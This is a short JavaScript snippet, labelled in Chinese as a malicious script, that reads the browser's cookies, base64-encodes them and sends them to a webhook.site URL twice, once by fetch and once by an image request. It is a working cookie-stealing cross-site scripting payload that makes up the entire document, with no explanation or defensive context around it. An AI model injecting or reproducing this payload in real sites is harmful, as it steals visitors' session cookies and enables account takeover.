// 惡意 script
var cookie = document.cookie;
fetch(
  "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?" +
    window.btoa(cookie)
);
new Image().src =
  "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?" +
  window.btoa(document.cookie);
